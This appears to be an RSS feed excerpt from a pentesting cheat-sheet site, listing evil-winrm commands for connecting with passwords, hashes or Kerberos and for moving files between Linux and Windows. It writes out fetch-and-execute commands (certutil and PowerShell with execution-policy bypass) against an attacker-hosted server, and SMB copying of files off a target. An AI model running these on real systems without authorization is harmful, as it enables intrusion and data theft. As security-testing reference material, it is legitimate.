channel.title: Evil-Winrm on TLDRBins
channel.description: Recent content in Evil-Winrm on TLDRBins

item.title: evil-winrm
item.description: Connection Methods Password Hash Kerberos crt & key evil-winrm -i <TARGET> -u <USER> -p '<PASSWORD>' evil-winrm -i <TARGET> -u <USER> -H <HASH> # Step 1: Edit '/etc/krb5.conf' [libdefaults] default_realm = <DOMAIN> [realms] <DOMAIN> = { kdc = <DC>:88 admin_server = <DC> default_domain = <DOMAIN> } [domain_realm] .domain.internal = <DOMAIN> domain.internal = <DOMAIN> # Step 2: export .ccache export KRB5CCNAME=<CCACHE> # Step 3: Connect sudo ntpdate -s <DC> && evil-winrm -i <TARGET> -r <DC> evil-winrm -i <TARGET> -S -k auth.

item.title: File Transfer (Linux to Windows)
item.description: CMD Powershell evil-winrm Start a Local HTTP Server python3 -m http.server <LOCAL_PORT> certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramData\<FILE> # Upload and Run certutil -urlcache -split -f http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> C:\ProgramData\<FILE> && C:\ProgramData\<FILE> Start a Local HTTP Server python3 -m http.server <LOCAL_PORT> # Long version Invoke-WebRequest http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -OutFile C:\ProgramData\<FILE> # Short version iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE> Note: PowerShell 3.0+ # Long version powershell.exe -ExecutionPolicy bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE> # Short version powershell -ep bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE> Note: curl is not always available

item.title: File Transfer (Windows To Linux)
item.description: SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\<LOCAL_IP>\share # Connect to SMB server with creds net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>' # From target Windows to local Linux copy <FILE> \\<LOCAL_IP>\share # From local Linux to target Windows copy \\<LOCAL_IP>\share\<FILE> <FILE> # Delete file del <FILE> # Remove SMB share net use /d \\<LOCAL_IP>\share # Older Windows (e.
